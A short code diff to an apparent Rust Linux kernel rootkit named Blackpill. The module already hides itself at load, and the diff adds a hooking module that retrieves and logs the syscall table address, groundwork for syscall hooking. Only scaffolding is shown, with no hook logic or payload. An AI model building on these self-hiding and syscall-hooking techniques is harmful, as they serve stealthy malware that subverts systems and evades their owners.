@@ -2,6 +2,7 @@
 //! To-do: complete doc
 
 pub(crate) mod hiding;
+pub(crate) mod hooking;
 pub(crate) mod hypervisor;
 #[macro_use]
 pub(crate) mod utils;
@@ -25,6 +26,9 @@ impl kernel::Module for Blackpill {
         pr_info!("Starting\n");
 
         hiding::hide(module);
+
+        let syscall_table: Option<*mut *mut u64> = hooking::get_syscall_table();
+        pr_info!("Syscall table address = {:?}", syscall_table);
 
         Ok(Blackpill)
     }
